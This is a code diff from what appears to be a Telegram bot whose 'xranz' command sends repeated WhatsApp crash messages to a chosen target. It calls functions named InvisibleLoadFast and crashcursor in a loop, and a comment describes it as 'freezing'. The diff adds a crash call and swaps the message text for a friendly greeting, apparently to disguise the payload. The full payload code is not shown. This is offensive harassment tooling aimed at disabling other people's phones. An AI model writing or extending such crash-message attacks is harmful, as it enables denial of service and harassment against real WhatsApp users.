@@ -1459,8 +1459,8 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 3; i++) {
-        await InvisibleLoadFast(target, { ptcp: true });
+  for (let i = 0; i < 2; i++) {
+        await crashcursor(target, { ptcp: true });
         await InvisibleLoadFast(target, { ptcp: true });
         
   }
@@ -2818,7 +2818,7 @@ async function InvisibleLoadFast(target) {
                   },
                 },
                 body: {
-                  text: "𝙉𝙖𝙣𝙤ી",
+                  text: "Assalamualaikum",
                 },
                 nativeFlowMessage: {
                   buttons: [
